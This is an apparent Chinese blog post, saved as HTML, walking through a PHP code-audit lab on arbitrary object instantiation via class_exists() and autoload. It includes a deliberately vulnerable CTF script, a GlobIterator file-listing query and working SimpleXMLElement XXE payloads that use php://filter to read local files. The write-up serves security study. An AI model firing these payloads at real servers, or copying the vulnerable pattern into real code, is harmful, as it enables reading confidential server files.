@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHP代码审计_函数篇-Day3 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="Day3PHP实例化任意对象漏洞关于函数
+class_exists() 函数：检查给定的类是否被定义
+
+1234567参数的含义：**class_exists**(string $class, bo,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHP代码审计_函数篇-Day3</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHP代码审计_函数篇-Day3</h1>
+        <div class="stuff">
+            <span>一月 28, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0/" rel="tag">代码审计-关于函数</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h3><h4 id="PHP实例化任意对象漏洞"><a href="#PHP实例化任意对象漏洞" class="headerlink" title="PHP实例化任意对象漏洞"></a>PHP实例化任意对象漏洞</h4><h5 id="关于函数"><a href="#关于函数" class="headerlink" title="关于函数"></a>关于函数</h5><ol>
+<li><strong>class_exists() 函数：检查给定的类是否被定义</strong></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参数的含义：</span><br><span class="line"></span><br><span class="line">**class_exists**(string $class, bool $autoload = **true**): bool</span><br><span class="line"></span><br><span class="line">$class：给定的类名；</span><br><span class="line"></span><br><span class="line">$autoload：如果该参数为true，（默认情况下为true），则自动调用程序中的 __autoload 函数，当该参数为false时，则不会调用__autoload函数。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>PHP类的自动加载：</strong></p>
+<p>为解决面向对象开发中需要用include包含大量文件的问题，引入可以注册任意数量函数的自动加载器，可以通过注册自动加载器加载所需的类和接口。</p>
+<p>相关函数：</p>
+<p>spl_autoload_register函数：注册给定的函数作为 __autoload 的实现</p>
+<p>__autoload函数：加载未定义的类</p>
+<p><img src="clipboard.png" alt="img"></p>
+<ol start="2">
+<li><strong>使用PHP的内置类 SimpleXMLElement 来进行 XXE 攻击：</strong></li>
+</ol>
+<p>SimpleXMLElement类：用来表示XML文档中的 元素。</p>
+<p>使用file协议读取（但是我这里没有办法直接读取到内容）</p>
+<p><img src="clipboard-1643369240223.png" alt="img"></p>
+<p>采用PHP伪协议读取：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">             &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/phpstudy_pro/WWW/shell.txt&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xml_class</span>= <span class="keyword">new</span> SimpleXMLElement(<span class="variable">$xml</span>,LIBXML_NOENT);</span><br><span class="line">var_dump(<span class="variable">$xml_class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="clipboard-1643369280792.png" alt="img"></p>
+<p>利用SimpleXMLElement类进行xxe的攻击得到文件的内容。</p>
+<p><strong>SimpleXMLElement::__construct：</strong></p>
+<p>创建一个新的SimpleXMLElement对象。</p>
+<p><img src="clipboard-1643369295117.png" alt="img"></p>
+<h4 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h4><p>结合函数和SimpleXMLElement内置类的用法来看这个代码：</p>
+<p>第八行代码使用class_exists()检查类是否存在，并且参数可控，之后会实例化一个$controllerName对象，实例化对象中的参数也可控。程序中存在__autoload函数，该函数中存在文件包含的漏洞点。</p>
+<p><img src="clipboard-1643369325197.png" alt="img"></p>
+<p>当我们尝试传入?c=D:/phpstudy_pro/WWW/1.php时，</p>
+<p><img src="clipboard-1643369338988.png" alt="img"></p>
+<p>class_exists()函数检查传入的类是否存在，并且默认调用__autoload()函数，导致文件包含的产生。</p>
+<p>第九行实例化类的类名和传入类的参数都是可控的，如果我们传入的自定义类为SimpleXMLElement时，会导致xxe攻击，用下面的ctf题目进行利用。</p>
+<h4 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">   <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">new</span> NotFound();</span><br><span class="line">   &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">   <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line">   var_dump(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在代码中我们发现实例化的类名是可控的，类名中的参数也是可控的，先是利用class_exists函数判断类名是否被定义，该函数会自动调用__autoload()函数，这里存在spl_autoload_register()函数，功能跟__autoload()是一样的。因此会调用到这个函数，实例化MotFound函数，执行__cinstruct，输出404。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里先用GlobIterator类来寻找flag文件的名字：</p>
+<p><img src="clipboard-1643369389115.png" alt="img"></p>
+<p>类似glob，能列出文件的目录。第一个参数为利用的GlobIterator方法，第二个参数为要查找的文件名，可以使用*管道符。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=GlobIterator&amp;param=*php</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1643369404547.png" alt="img"></p>
+<p>找到一个可能存在flag的文件：f1agi3hEre.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们传入类为SimpleXMLElement来读取内容，参数param为XML的内容，使用PHP伪协议读取：</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/phpstudy_pro/WWW/b.com/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</span><br><span class="line">参数param2就是SimpleXMLElement::construct的第二个参数，2对应的模式是 LIBXML_NOENT。</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1643369441411.png" alt="img"></p>
+<p>base64解码，就能读取到文件的内容：</p>
+<p><img src="clipboard-1643369449795.png" alt="img"></p>
+<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day3/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day3/files/README.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lxfweb/p/13822440.html">https://www.cnblogs.com/lxfweb/p/13822440.html</a></p>
+<ul>
+<li>以上代码均来自红日安全团队github项目。</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Day3"><span class="toc-number">1.</span> <span class="toc-text">Day3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">PHP实例化任意对象漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">关于函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eg"><span class="toc-number">1.2.</span> <span class="toc-text">eg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">CTF题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章：</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
